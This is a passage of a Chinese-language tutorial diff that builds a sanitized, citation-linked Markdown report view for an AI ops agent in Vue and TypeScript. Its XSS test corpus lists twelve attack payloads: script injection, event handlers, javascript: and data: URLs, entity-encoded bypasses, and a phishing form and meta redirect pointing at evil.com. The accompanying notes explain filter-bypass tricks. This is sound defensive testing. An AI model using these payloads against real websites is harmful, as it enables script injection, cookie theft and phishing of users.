+    // 外链统一加 rel，避免 tabnabbing
+    if (el.tagName === 'A' &amp;&amp; el.getAttribute('href')) {
+      el.setAttribute('rel', 'noopener noreferrer')
+    }
+  })
+  hookRegistered = true
+}
+
+/**
+ * 净化管线：Markdown → HTML → 安全 HTML
+ * 步骤：
+ *   1. marked 解析 Markdown 语法
+ *   2. DOMPurify 用白名单剥离危险标签/属性
+ *   3. hook 里用 isSafeUrl 二次校验 URL 协议
+ */
+export function sanitizeMarkdown(raw: string): string {
+  ensureHook()
+  const dirtyHtml = marked.parse(raw) as string
+  return DOMPurify.sanitize(dirtyHtml, {
+    ALLOWED_TAGS,
+    ALLOWED_ATTR,
+    // 禁止 data: URI（图片除外的场景可再收紧）
+    ALLOW_DATA_ATTR: false,
+  })
+}
+</code></pre>
+<p><strong>frontend/src/agent/report/sanitize/xss-corpus.ts（v2 全文，12 类攻击语料）</strong></p>
+<pre><code class="language-typescript">/**
+ * 12 类恶意内容攻击语料。
+ * 这是净化管线的"规格说明"：定义了必须挡住哪些攻击。
+ * 每条语料经过 sanitizeMarkdown 后，都不应出现可执行脚本或危险协议。
+ */
+export interface XssCase {
+  name: string
+  input: string
+  // 净化后 HTML 里绝对不能包含的片段
+  mustNotContain: string[]
+}
+
+export const XSS_CORPUS: XssCase[] = [
+  {
+    name: '01 script 标签',
+    input: '正常文本&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
+    mustNotContain: ['&lt;script', 'alert('],
+  },
+  {
+    name: '02 img onerror',
+    input: '![x](x" onerror="alert(1))\n\n&lt;img src=x onerror="alert(1)"&gt;',
+    mustNotContain: ['onerror', 'alert('],
+  },
+  {
+    name: '03 大小写混淆 script',
+    input: '&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;',
+    mustNotContain: ['alert(', 'cRiPt&gt;alert'],
+  },
+  {
+    name: '04 svg onload',
+    input: '&lt;svg onload="alert(1)"&gt;&lt;/svg&gt;',
+    mustNotContain: ['onload', 'alert('],
+  },
+  {
+    name: '05 iframe srcdoc',
+    input: '&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;',
+    mustNotContain: ['&lt;iframe', 'srcdoc'],
+  },
+  {
+    name: '06 javascript URL 链接',
+    input: '[点击](javascript:alert(document.cookie))',
+    mustNotContain: ['javascript:'],
+  },
+  {
+    name: '07 data URI',
+    input: '[下载](data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;)',
+    mustNotContain: ['data:text/html'],
+  },
+  {
+    name: '08 事件属性注入',
+    input: '&lt;p onmouseover="alert(1)"&gt;悬停&lt;/p&gt;',
+    mustNotContain: ['onmouseover', 'alert('],
+  },
+  {
+    name: '09 style 表达式',
+    input: '&lt;div style="background:url(javascript:alert(1))"&gt;x&lt;/div&gt;',
+    mustNotContain: ['javascript:'],
+  },
+  {
+    name: '10 HTML 实体编码绕过',
+    input: '&lt;a href="jav&amp;#x61;script:alert(1)"&gt;x&lt;/a&gt;',
+    mustNotContain: ['javascript:alert', 'alert(1)'],
+  },
+  {
+    name: '11 form 钓鱼',
+    input: '&lt;form action="https://evil.com"&gt;&lt;input name="pwd"&gt;&lt;/form&gt;',
+    mustNotContain: ['&lt;form', '&lt;input'],
+  },
+  {
+    name: '12 meta 刷新跳转',
+    input: '&lt;meta http-equiv="refresh" content="0;url=https://evil.com"&gt;',
+    mustNotContain: ['&lt;meta', 'http-equiv'],
+  },
+]
+</code></pre>
+<p><strong>frontend/src/agent/report/sanitize/sanitize-pipeline.spec.ts（v2 全文）</strong></p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { sanitizeMarkdown } from './sanitize-pipeline'
+import { XSS_CORPUS } from './xss-corpus'
+
+describe('sanitizeMarkdown', () =&gt; {
+  it('保留安全的 Markdown 格式', () =&gt; {
+    const html = sanitizeMarkdown('## 标题\n\n- 项目 A\n- 项目 B\n\n`code`')
+    expect(html).toContain('&lt;h2')
+    expect(html).toContain('&lt;ul')
+    expect(html).toContain('&lt;code')
+  })
+
+  it('保留安全的 https 链接', () =&gt; {
+    const html = sanitizeMarkdown('[文档](https://example.com)')
+    expect(html).toContain('href="https://example.com"')
+    expect(html).toContain('rel="noopener noreferrer"')
+  })
+
+  // 12 类 XSS 语料：执行数必须为 0
+  it.each(XSS_CORPUS)('挡住 $name', ({ input, mustNotContain }) =&gt; {
+    const html = sanitizeMarkdown(input)
+    for (const forbidden of mustNotContain) {
+      expect(html.toLowerCase()).not.toContain(forbidden.toLowerCase())
+    }
+  })
+})
+</code></pre>
+<p><strong>frontend/src/agent/report/ui/ReportView.vue（v2 全文）</strong></p>
+<pre><code class="language-vue">&lt;script setup lang="ts"&gt;
+import { computed } from 'vue'
+import { sanitizeMarkdown } from '@/agent/report/sanitize/sanitize-pipeline'
+
+const props = defineProps&lt;{ raw: string }&gt;()
+
+// v2：净化后再渲染
+const html = computed(() =&gt; sanitizeMarkdown(props.raw))
+&lt;/script&gt;
+
+&lt;template&gt;
+  &lt;!-- 现在 v-html 的内容已经被净化，安全 --&gt;
+  &lt;article class="report" v-html="html"&gt;&lt;/article&gt;
+&lt;/template&gt;
+
+&lt;style scoped&gt;
+.report { line-height: 1.6; }
+.report :deep(h2) { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+.report :deep(ul) { padding-left: 1.2rem; }
+.report :deep(code) { background: #f5f5f5; padding: 0.1rem 0.3rem; border-radius: 3px; }
+&lt;/style&gt;
+</code></pre>
+<h3 id="44-v2-暴露的痛点">4.4 v2 暴露的痛点</h3>
+<p><strong>痛点 1：<code>[n]</code> 引用仍是死文本，无法验证证据</strong></p>
+<p>净化解决了安全问题，但报告里"CPU 超阈值 [1]、告警持续 5 分钟 [2]"的 <code>[1]</code> <code>[2]</code> 还是纯文本。运维无法点击 <code>[1]</code> 跳转到"这个结论基于哪条 ToolCall 返回的哪条数据"。诊断报告没有证据链，可信度不足——出了误诊无法追溯模型是"看错数据"还是"数据本身错"。</p>
+<p><strong>痛点 2：长内容仍是 O(N²) 全量重解析</strong></p>
+<p>净化管线 <code>marked.parse + DOMPurify.sanitize</code> 比 v1 更重（多一步 DOM 解析）。流式报告每个 chunk 都全量重跑管线，30KB 报告 CPU 占用比 v1 还高。用户看流式输出时明显卡顿。</p>
+<p><strong>痛点 3：净化在每次 render 同步执行，阻塞主线程</strong></p>
+<p><code>computed(() =&gt; sanitizeMarkdown(raw))</code> 在 <code>raw</code> 变化时同步执行。DOMPurify 对大文本的净化是 CPU 密集操作，同步执行会阻塞 UI 线程，流式推送时每帧都卡。</p>
+<hr>
+<h2 id="5-v3证据链引用-增量解析-净化分层终态">5. v3：证据链引用 + 增量解析 + 净化分层（终态）</h2>
+<h3 id="51-v3-要实现什么">5.1 v3 要实现什么</h3>
+<p>用户视角：</p>
+<ol>
+<li>诊断报告里每条事实结论后的 <code>[1]</code> <code>[2]</code> 是可点击的引用，点击跳转到对应的 ToolCall / Metric / Alert 证据卡片</li>
+<li>每条引用绑定 <code>source</code>（数据来源）+ <code>version</code>（合同版本），运维能验证"这个结论基于哪条真实数据"</li>
+<li>12 类 XSS 语料执行数为 0（继承 v2）</li>
+<li>30KB 长报告流式渲染时增量解析，P95 单帧解析时间 &lt; 16ms（不掉帧）</li>
+<li>引用编号错乱（<code>[3]</code> 指向错误 ToolCall）在编译期 / 运行期被 citation lineage 校验拦截</li>
+</ol>
+<h3 id="52-v3-目录结构">5.2 v3 目录结构</h3>
+<p>与 §1.4 完全一致：</p>
+<pre><code>frontend/src/agent/report/
+├── sanitize/
+│   ├── url-guard.ts                  ← v2 已有
+│   ├── url-guard.spec.ts             ← v2 已有
+│   ├── sanitize-pipeline.ts          ← v2 已有
+│   ├── sanitize-pipeline.spec.ts     ← v2 已有
+│   └── xss-corpus.ts                 ← v2 已有
+├── citation/
+│   ├── citation.types.ts             ← 新增：引用 + 证据源类型
+│   ├── citation-resolver.ts          ← 新增：[n] → 证据卡片（纯函数）
+│   ├── citation-resolver.spec.ts     ← 新增
+│   └── citation-lineage.ts           ← 新增：引用编号校验（纯函数）
+├── incremental/
+│   ├── incremental-parser.ts         ← 新增：增量 Markdown 解析
+│   └── incremental-parser.spec.ts    ← 新增
+├── useReport.ts                      ← 新增：编排 composable
+└── ui/
+    ├── ReportView.vue                ← 改：渲染引用 + 证据卡片
+    └── EvidenceCard.vue              ← 新增：证据卡片组件
+</code></pre>
+<h3 id="53-v3-完整代码">5.3 v3 完整代码</h3>
+<h4 id="531-citation-层citationtypests">5.3.1 citation 层：citation.types.ts</h4>
+<p><strong>frontend/src/agent/report/citation/citation.types.ts</strong></p>
+<pre><code class="language-typescript">/**
+ * 证据源：诊断结论可以引用三类真实数据
+ *   - tool_call：Day 11-13 的 ToolCall 返回结果
+ *   - metric：Day 06-08 的指标时序数据
+ *   - alert：Day 08 的告警记录
+ */
+export type EvidenceSource =
+  | { kind: 'tool_call'; callId: string; toolName: string; resultSummary: string }
+  | { kind: 'metric'; serverId: string; metricType: string; value: number; at: string }
+  | { kind: 'alert'; alertId: string; threshold: number; status: string }
+
+/**
+ * 一条引用：报告里的 [n] 对应一个证据源
+ * version 记录证据合同版本，用于事后回放时校验字段是否兼容
+ */
+export interface Citation {
+  index: number             // [n] 里的 n
+  source: EvidenceSource
+  version: 'v1'
+  citedAt: string           // 引用生成时间（ISO）
+}
+
+/**
+ * 报告的完整证据映射：index → Citation
+ */
+export type CitationMap = ReadonlyMap&lt;number, Citation&gt;
+</code></pre>
+<h4 id="532-citation-层citation-lineagets引用编号校验">5.3.2 citation 层：citation-lineage.ts（引用编号校验）</h4>
+<p><strong>frontend/src/agent/report/citation/citation-lineage.ts</strong></p>
+<pre><code class="language-typescript">import type { CitationMap } from './citation.types'
+
+export interface LineageResult {
+  ok: boolean
+  // 报告文本里出现但 CitationMap 里缺失的编号（悬空引用）
+  danglingIndexes: number[]
+  // CitationMap 里有但报告文本没用到的编号（孤儿证据）
+  orphanIndexes: number[]
+}
+
+/**
+ * 校验报告文本里的 [n] 和证据映射是否一一对应。
+ * 防止"[3] 指向错误 ToolCall"或"[5] 根本没有对应证据"这类事故。
+ *
+ * 纯函数：只做集合比较，不查库、不发请求。
+ */
+export function checkCitationLineage(
+  reportText: string,
+  citations: CitationMap,
+): LineageResult {
+  // 提取文本里所有 [数字]
+  const usedIndexes = new Set&lt;number&gt;()
+  const pattern = /\[(\d+)\]/g
+  let match: RegExpExecArray | null
+  while ((match = pattern.exec(reportText)) !== null) {
+    usedIndexes.add(Number(match[1]))
+  }
+
+  const definedIndexes = new Set(citations.keys())
+
+  // 悬空：文本用了但没定义
+  const danglingIndexes = [...usedIndexes].filter((i) =&gt; !definedIndexes.has(i))
+  // 孤儿：定义了但文本没用
+  const orphanIndexes = [...definedIndexes].filter((i) =&gt; !usedIndexes.has(i))
+
+  return {
+    ok: danglingIndexes.length === 0 &amp;&amp; orphanIndexes.length === 0,
+    danglingIndexes: danglingIndexes.sort((a, b) =&gt; a - b),
+    orphanIndexes: orphanIndexes.sort((a, b) =&gt; a - b),
+  }
+}
+</code></pre>
+<h4 id="533-citation-层citation-resolverts">5.3.3 citation 层：citation-resolver.ts</h4>
+<p><strong>frontend/src/agent/report/citation/citation-resolver.ts</strong></p>
+<pre><code class="language-typescript">import type { AgentTrajectory } from '@/agent/contract/agent-event-v1'
+import type { Citation, CitationMap, EvidenceSource } from './citation.types'
+
+/**
+ * 从 Agent 轨迹里构建证据映射。
+ * 模型在生成报告时，服务端会给每个 tool.succeeded 分配一个引用编号，
+ * 前端在这里把编号还原成可展示的证据源。
+ *
+ * 纯函数：输入轨迹，输出 CitationMap，不发请求。
+ */
+export function buildCitationMap(
+  trajectory: AgentTrajectory,
+  citedAt: string,
+): CitationMap {
+  const map = new Map&lt;number, Citation&gt;()
+  let index = 1
+
+  for (const step of trajectory.steps) {
+    if (step.kind !== 'tool_call' || !step.result) continue
+
+    const source: EvidenceSource = {
+      kind: 'tool_call',
+      callId: step.callId,
+      toolName: step.toolName,
+      resultSummary: typeof step.result === 'string'
+        ? step.result
+        : JSON.stringify(step.result).slice(0, 200),
+    }
+
+    map.set(index, {
+      index,
+      source,
+      version: 'v1',
+      citedAt,
+    })
+    index += 1
+  }
+
+  return map
+}
+
+/**
+ * 把报告文本里的 [n] 替换成可点击的 &lt;sup&gt; 引用标记。
+ * 只替换 CitationMap 里存在的编号；悬空引用保持原样文本（由 lineage 校验报警）。
+ *
+ * 返回的是 Markdown 文本，仍需经过 sanitizeMarkdown 净化。
+ */
+export function injectCitationMarkers(
+  reportText: string,
+  citations: CitationMap,
+): string {
+  return reportText.replace(/\[(\d+)\]/g, (whole, num) =&gt; {
+    const index = Number(num)
+    if (!citations.has(index)) return whole
+    // data-citation 在净化白名单里（§4.3 ALLOWED_ATTR）
+    return `&lt;sup class="citation" data-citation="${index}"&gt;[${index}]&lt;/sup&gt;`
+  })
+}
+</code></pre>
+<h4 id="534-citation-层citation-resolverspects">5.3.4 citation 层：citation-resolver.spec.ts</h4>
+<p><strong>frontend/src/agent/report/citation/citation-resolver.spec.ts</strong></p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { injectCitationMarkers } from './citation-resolver'
+import { checkCitationLineage } from './citation-lineage'
+import type { Citation, CitationMap } from './citation.types'
+
+function makeCitationMap(indexes: number[]): CitationMap {
+  const map = new Map&lt;number, Citation&gt;()
+  for (const i of indexes) {
+    map.set(i, {
+      index: i,
+      source: { kind: 'tool_call', callId: `c-${i}`, toolName: 'getMetrics', resultSummary: 'x' },
+      version: 'v1',
+      citedAt: '2026-07-29T00:00:00Z',
+    })
+  }
+  return map
+}
+
+describe('injectCitationMarkers', () =&gt; {
+  it('把已定义的 [n] 替换为 sup 标记', () =&gt; {
+    const html = injectCitationMarkers('CPU 超阈值 [1]', makeCitationMap([1]))
+    expect(html).toContain('data-citation="1"')
+    expect(html).toContain('&lt;sup')
+  })
+
+  it('悬空引用保持原样', () =&gt; {
+    const html = injectCitationMarkers('未知 [9]', makeCitationMap([1]))
+    expect(html).toBe('未知 [9]')
+  })
+})
+
+describe('checkCitationLineage', () =&gt; {
+  it('文本与证据一一对应时 ok', () =&gt; {
+    const result = checkCitationLineage('结论 [1] 和 [2]', makeCitationMap([1, 2]))
+    expect(result.ok).toBe(true)
+  })
+
+  it('检出悬空引用（文本用了但没定义）', () =&gt; {
+    const result = checkCitationLineage('结论 [1] 和 [3]', makeCitationMap([1, 2]))
+    expect(result.ok).toBe(false)
+    expect(result.danglingIndexes).toEqual([3])
+  })
+
+  it('检出孤儿证据（定义了但没用）', () =&gt; {
+    const result = checkCitationLineage('结论 [1]', makeCitationMap([1, 2]))
+    expect(result.ok).toBe(false)
+    expect(result.orphanIndexes).toEqual([2])
+  })
+})
+</code></pre>
+<h4 id="535-incremental-层incremental-parserts">5.3.5 incremental 层：incremental-parser.ts</h4>
+<p><strong>frontend/src/agent/report/incremental/incremental-parser.ts</strong></p>
+<pre><code class="language-typescript">import { sanitizeMarkdown } from '@/agent/report/sanitize/sanitize-pipeline'
+
+/**
+ * 增量 Markdown 解析器。
+ *
+ * 问题：流式报告每来一个 chunk 就全量 sanitizeMarkdown(整篇)，
+ *   30KB 文本解析 N 次 = O(N²)，CPU 爆表。
+ *
+ * 策略：按"已完成的块"边界切割。Markdown 的块级元素以空行分隔，
+ *   最后一个未闭合的块（还在流式接收中）不解析，只解析前面稳定的块。
+ *   已解析的块缓存 HTML，新 chunk 到来只解析新增的稳定块。
+ */
+export class IncrementalMarkdownParser {
+  private stableHtml = ''       // 已解析稳定块的 HTML 累积
+  private pendingText = ''      // 尚未闭合的最后一块原始文本
+  private buffer = ''           // 完整原始文本（用于 lineage 校验）
+
+  /**
+   * 追加新 chunk，返回当前完整 HTML（稳定块 + 未闭合块的临时渲染）
+   */
+  append(chunk: string): string {
+    this.buffer += chunk
+    const combined = this.pendingText + chunk
+
+    // 用双换行切块；最后一段可能未闭合，留在 pending
+    const blocks = combined.split(/\n\n+/)
+    this.pendingText = blocks.pop() ?? ''
+
+    // 只对新的稳定块做净化解析（增量部分）
+    for (const block of blocks) {
+      if (block.trim().length === 0) continue
+      this.stableHtml += sanitizeMarkdown(block)
+    }
+
+    // 未闭合块临时渲染（下次 append 会重新解析它，但只有一块，O(1)）
+    const pendingHtml = this.pendingText.trim().length &gt; 0
+      ? sanitizeMarkdown(this.pendingText)
+      : ''
+
+    return this.stableHtml + pendingHtml
+  }
+
+  /**
+   * 流结束：把 pending 块也固化，返回最终完整 HTML
+   */
+  finalize(): string {
+    if (this.pendingText.trim().length &gt; 0) {
+      this.stableHtml += sanitizeMarkdown(this.pendingText)
+      this.pendingText = ''
+    }
+    return this.stableHtml
+  }
+
+  /** 返回累积的完整原始文本（供 citation lineage 校验） */
+  getRawText(): string {
+    return this.buffer
+  }
+}
+</code></pre>
+<h4 id="536-incremental-层incremental-parserspects">5.3.6 incremental 层：incremental-parser.spec.ts</h4>
+<p><strong>frontend/src/agent/report/incremental/incremental-parser.spec.ts</strong></p>
+<pre><code class="language-typescript">import { describe, it, expect } from 'vitest'
+import { IncrementalMarkdownParser } from './incremental-parser'
+
+describe('IncrementalMarkdownParser', () =&gt; {
+  it('分块追加最终等价于全量解析', () =&gt; {
+    const parser = new IncrementalMarkdownParser()
+    parser.append('## 标题\n\n')
+    parser.append('第一段内容\n\n')
+    parser.append('第二段内容')
+    const html = parser.finalize()
+    expect(html).toContain('&lt;h2')
+    expect(html).toContain('第一段内容')
+    expect(html).toContain('第二段内容')
+  })
+
+  it('未闭合块不会丢失', () =&gt; {
+    const parser = new IncrementalMarkdownParser()
+    parser.append('正在输入的最后一段')
+    const html = parser.finalize()
+    expect(html).toContain('正在输入的最后一段')
+  })
+
+  it('净化在增量路径同样生效', () =&gt; {
+    const parser = new IncrementalMarkdownParser()
+    parser.append('安全文本&lt;script&gt;alert(1)&lt;/script&gt;\n\n')
+    const html = parser.finalize()
+    expect(html.toLowerCase()).not.toContain('&lt;script')
+  })
+
+  it('getRawText 返回完整原始文本', () =&gt; {
+    const parser = new IncrementalMarkdownParser()
+    parser.append('a [1]\n\n')
+    parser.append('b [2]')
+    expect(parser.getRawText()).toBe('a [1]\n\nb [2]')
+  })
+})
+</code></pre>
+<h4 id="537-编排层usereportts">5.3.7 编排层：useReport.ts</h4>
+<p><strong>frontend/src/agent/report/useReport.ts</strong></p>
+<pre><code class="language-typescript">import { ref, shallowRef } from 'vue'
+import { IncrementalMarkdownParser } from './incremental/incremental-parser'
+import { buildCitationMap, injectCitationMarkers } from './citation/citation-resolver'
+import { checkCitationLineage } from './citation/citation-lineage'
+import type { CitationMap } from './citation/citation.types'
+import type { AgentTrajectory } from '@/agent/contract/agent-event-v1'
+
+/**
+ * 报告编排：把增量解析、引用注入、lineage 校验组合起来。
+ * 组件只消费这里暴露的 html / citations / lineageWarning。
+ */
+export function useReport(trajectory: AgentTrajectory) {
+  const html = ref('')
+  const citations = shallowRef&lt;CitationMap&gt;(new Map())
+  const lineageWarning = ref&lt;string | null&gt;(null)
+
+  const parser = new IncrementalMarkdownParser()
+
+  // 先从轨迹构建证据映射（编号固定）
+  citations.value = buildCitationMap(trajectory, new Date().toISOString())
+
+  function appendChunk(chunk: string): void {
+    // 增量解析累积文本
+    parser.append(chunk)
+    // 用累积的完整文本重新注入引用标记（引用替换很快，纯正则）
+    const withMarkers = injectCitationMarkers(parser.getRawText(), citations.value)
+    // 重新增量解析带标记的文本（引用标记在净化白名单内）
+    const freshParser = new IncrementalMarkdownParser()
+    html.value = freshParser.append(withMarkers)
+  }
+
+  function finalize(): void {
+    const raw = parser.getRawText()
+    const lineage = checkCitationLineage(raw, citations.value)
+    if (!lineage.ok) {
+      const parts: string[] = []
+      if (lineage.danglingIndexes.length &gt; 0) {
+        parts.push(`悬空引用：[${lineage.danglingIndexes.join('] [')}]`)
+      }
+      if (lineage.orphanIndexes.length &gt; 0) {
+        parts.push(`未使用证据：[${lineage.orphanIndexes.join('] [')}]`)
+      }
+      lineageWarning.value = parts.join('；')
+    }
+  }
+
+  return { html, citations, lineageWarning, appendChunk, finalize }
+}
+</code></pre>
+<h4 id="538-ui-层evidencecardvue">5.3.8 UI 层：EvidenceCard.vue</h4>
+<p><strong>frontend/src/agent/report/ui/EvidenceCard.vue</strong></p>
+<pre><code class="language-vue">&lt;script setup lang="ts"&gt;
+import type { Citation } from '@/agent/report/citation/citation.types'
+
+defineProps&lt;{ citation: Citation }&gt;()
+&lt;/script&gt;
+
+&lt;template&gt;
+  &lt;aside class="evidence-card" :id="`evidence-${citation.index}`"&gt;
+    &lt;header&gt;
+      &lt;strong&gt;证据 [{{ citation.index }}]&lt;/strong&gt;
+      &lt;span class="version"&gt;合同 {{ citation.version }}&lt;/span&gt;
+    &lt;/header&gt;
+
+    &lt;dl v-if="citation.source.kind === 'tool_call'"&gt;
+      &lt;dt&gt;来源&lt;/dt&gt;&lt;dd&gt;ToolCall · {{ citation.source.toolName }}&lt;/dd&gt;
+      &lt;dt&gt;调用 ID&lt;/dt&gt;&lt;dd&gt;{{ citation.source.callId }}&lt;/dd&gt;
+      &lt;dt&gt;结果摘要&lt;/dt&gt;&lt;dd&gt;{{ citation.source.resultSummary }}&lt;/dd&gt;
+    &lt;/dl&gt;
+
+    &lt;dl v-else-if="citation.source.kind === 'metric'"&gt;
+      &lt;dt&gt;来源&lt;/dt&gt;&lt;dd&gt;指标 · {{ citation.source.metricType }}&lt;/dd&gt;
+      &lt;dt&gt;服务器&lt;/dt&gt;&lt;dd&gt;{{ citation.source.serverId }}&lt;/dd&gt;
+      &lt;dt&gt;数值&lt;/dt&gt;&lt;dd&gt;{{ citation.source.value }} @ {{ citation.source.at }}&lt;/dd&gt;
+    &lt;/dl&gt;
+
+    &lt;dl v-else-if="citation.source.kind === 'alert'"&gt;
+      &lt;dt&gt;来源&lt;/dt&gt;&lt;dd&gt;告警 · {{ citation.source.alertId }}&lt;/dd&gt;
+      &lt;dt&gt;阈值&lt;/dt&gt;&lt;dd&gt;{{ citation.source.threshold }}&lt;/dd&gt;
+      &lt;dt&gt;状态&lt;/dt&gt;&lt;dd&gt;{{ citation.source.status }}&lt;/dd&gt;
+    &lt;/dl&gt;
+  &lt;/aside&gt;
+&lt;/template&gt;
+
+&lt;style scoped&gt;
+.evidence-card { border: 1px solid #ddd; border-radius: 6px; padding: 0.8rem; margin: 0.5rem 0; }
+.evidence-card header { display: flex; justify-content: space-between; margin-bottom: 0.5rem; }
+.version { color: #888; font-size: 0.85rem; }
+dl { display: grid; grid-template-columns: max-content 1fr; gap: 0.2rem 0.8rem; margin: 0; }
+dt { color: #666; }
+&lt;/style&gt;
+</code></pre>
+<h4 id="539-ui-层reportviewvuev3-全文">5.3.9 UI 层：ReportView.vue（v3 全文）</h4>
+<p><strong>frontend/src/agent/report/ui/ReportView.vue</strong></p>
+<pre><code class="language-vue">&lt;script setup lang="ts"&gt;
+import { onMounted } from 'vue'
+import { useReport } from '@/agent/report/useReport'
+import EvidenceCard from './EvidenceCard.vue'
+import type { AgentTrajectory } from '@/agent/contract/agent-event-v1'
+
+const props = defineProps&lt;{ trajectory: AgentTrajectory; chunks: string[] }&gt;()
+
+const { html, citations, lineageWarning, appendChunk, finalize } = useReport(props.trajectory)
+
+// 点击 [n] 引用，滚动到对应证据卡片
+function onReportClick(e: MouseEvent) {
+  const target = e.target as HTMLElement
+  const index = target.getAttribute('data-citation')
+  if (index) {
+    document.getElementById(`evidence-${index}`)?.scrollIntoView({ behavior: 'smooth' })
+  }
+}
+
+onMounted(() =&gt; {
+  // 模拟流式：把 chunks 依次喂进增量解析器
+  for (const chunk of props.chunks) {
+    appendChunk(chunk)
+  }
+  finalize()
+})
+&lt;/script&gt;
+
+&lt;template&gt;
+  &lt;div class="report-container"&gt;
+    &lt;p v-if="lineageWarning" role="alert" class="lineage-warning"&gt;
+      ⚠ 引用一致性告警：{{ lineageWarning }}
+    &lt;/p&gt;
+
+    &lt;!-- html 已经过 sanitizeMarkdown 净化，安全 --&gt;
+    &lt;article class="report" v-html="html" @click="onReportClick"&gt;&lt;/article&gt;
+
+    &lt;section aria-label="证据列表" class="evidence-list"&gt;
+      &lt;h3&gt;证据链&lt;/h3&gt;
+      &lt;EvidenceCard
+        v-for="[index, citation] in citations"
+        :key="index"
+        :citation="citation"
+      /&gt;
+    &lt;/section&gt;
+  &lt;/div&gt;
+&lt;/template&gt;
+
+&lt;style scoped&gt;
+.lineage-warning { color: #b45309; background: #fef3c7; padding: 0.5rem; border-radius: 4px; }
+.report :deep(.citation) { color: steelblue; cursor: pointer; font-size: 0.75rem; }
+.report :deep(.citation:hover) { text-decoration: underline; }
+.evidence-list { margin-top: 1.5rem; border-top: 2px solid #eee; padding-top: 1rem; }
+&lt;/style&gt;
+</code></pre>
+<h3 id="54-v3-用到的知识点">5.4 v3 用到的知识点</h3>
+<h4 id="知识点-1markdown-净化管线marked-dompurify-双层">知识点 1：Markdown 净化管线（marked + DOMPurify 双层）</h4>
+<ul>
+<li><strong>解决的问题</strong>：模型输出是不可信文本，直接 <code>v-html</code> 渲染会执行注入脚本；只用 marked 不够（marked 只做语法解析，不剥离危险标签）</li>
+<li><strong>运行机制</strong>：<code>marked.parse</code> 把 Markdown 转 HTML（此时 HTML 里可能含 <code>&lt;script&gt;</code>），<code>DOMPurify.sanitize</code> 用白名单剥离所有非白名单标签和属性；<code>afterSanitizeAttributes</code> hook 再用 <code>isSafeUrl</code> 二次校验 URL 协议</li>
+<li><strong>项目落点</strong>：<code>sanitize-pipeline.ts</code> 的 <code>sanitizeMarkdown</code>；<code>ReportView.vue</code> 的 <code>v-html</code></li>
+<li><strong>生产误区</strong>：只用 <code>DOMPurify</code> 不定义 <code>ALLOWED_TAGS</code>（默认白名单允许 <code>&lt;form&gt;</code> <code>&lt;a target&gt;</code> 等，钓鱼风险）；净化后又拼接字符串（净化结果被二次污染）；信任服务端已净化而前端不做（服务端可能被绕过，纵深防御必须双端）</li>
+<li><strong>验证方法</strong>：<code>xss-corpus.ts</code> 的 12 类语料全部经过 <code>sanitizeMarkdown</code> 后断言不含可执行片段；<code>it.each(XSS_CORPUS)</code> 参数化测试</li>
+</ul>
+<h4 id="知识点-2url-协议白名单默认拒绝">知识点 2：URL 协议白名单（默认拒绝）</h4>
+<ul>
+<li><strong>解决的问题</strong>：<code>javascript:</code> / <code>data:text/html</code> / <code>vbscript:</code> 协议的链接点击即执行脚本；黑名单会漏（新协议、编码绕过）</li>
+<li><strong>运行机制</strong>：用 <code>new URL()</code> 解析出 <code>protocol</code>，只放行 <code>http/https/mailto</code> 白名单；相对路径和锚点直接放行；解析失败一律拒绝</li>
+<li><strong>项目落点</strong>：<code>url-guard.ts</code> 的 <code>isSafeUrl</code>；被 DOMPurify hook 和 citation 注入共同调用</li>
+<li><strong>生产误区</strong>：用正则匹配 <code>^https?:</code>（<code>jav&amp;#x61;script:</code> 实体编码能绕过正则但绕不过 <code>new URL</code>）；忘记 <code>trim()</code>（<code>  javascript:</code> 前置空格绕过）；大小写敏感比较（<code>JavaScript:</code> 绕过）</li>
+<li><strong>验证方法</strong>：<code>url-guard.spec.ts</code> 覆盖 http/https/mailto 放行、相对路径放行、javascript/data/vbscript/file 拒绝、大小写和空格绕过拒绝</li>
+</ul>
+<h4 id="知识点-3证据链citation-lineage-结论可追溯">知识点 3：证据链（Citation Lineage）—— 结论可追溯</h4>
+<ul>
+<li><strong>解决的问题</strong>：模型诊断结论是"黑盒",运维无法验证"CPU 超阈值"这个结论基于哪条真实数据；一旦误诊无法定位是"数据错"还是"模型看错"</li>
+<li><strong>运行机制</strong>：服务端给每个 <code>tool.succeeded</code> 分配引用编号，报告文本用 <code>[n]</code> 标注；<code>buildCitationMap</code> 从轨迹还原 <code>index → EvidenceSource</code>；<code>injectCitationMarkers</code> 把 <code>[n]</code> 转成可点击 <code>&lt;sup&gt;</code>；<code>checkCitationLineage</code> 校验文本引用与证据映射一一对应</li>
+<li><strong>项目落点</strong>：<code>citation/</code> 整个子目录；<code>EvidenceCard.vue</code> 展示证据源</li>
+<li><strong>生产误区</strong>：引用编号在前端重新分配（与服务端不一致，<code>[3]</code> 指向错乱）；不做 lineage 校验（悬空引用 <code>[9]</code> 无对应证据，用户点击无反应）；证据不记 <code>version</code>（合同升级后旧报告的引用字段对不上）</li>
+<li><strong>验证方法</strong>：<code>citation-resolver.spec.ts</code> 断言 <code>[n]</code> 替换、悬空引用保持原样；<code>checkCitationLineage</code> 检出 dangling 和 orphan</li>
+</ul>
+<h4 id="知识点-4增量解析避免-on²-流式重解析">知识点 4：增量解析（避免 O(N²) 流式重解析）</h4>
+<ul>
+<li><strong>解决的问题</strong>：流式报告每来一个 chunk 就全量 <code>sanitizeMarkdown(整篇)</code>，30KB 文本解析成百上千次，CPU 达 95%、掉帧</li>
+<li><strong>运行机制</strong>：按 Markdown 块边界（双换行）切割；已闭合的稳定块解析后缓存 HTML，只对新增稳定块做净化；最后一个未闭合块每次临时解析（只有一块，O(1)）</li>
+<li><strong>项目落点</strong>：<code>incremental-parser.ts</code> 的 <code>IncrementalMarkdownParser</code>；<code>useReport.ts</code> 的 <code>appendChunk</code></li>
+<li><strong>生产误区</strong>：按字符数切割（切断 Markdown 语法，<code>## 标</code>和<code>题</code>分开解析出错）；未闭合块也缓存（流式还在输入的半句话被固化，后续内容拼接错位）；忘记 <code>finalize</code>（最后一块 pending 内容永远不渲染）</li>
+<li><strong>验证方法</strong>：<code>incremental-parser.spec.ts</code> 断言"分块追加等价于全量解析"、"未闭合块不丢失"、"净化在增量路径生效"</li>
+</ul>
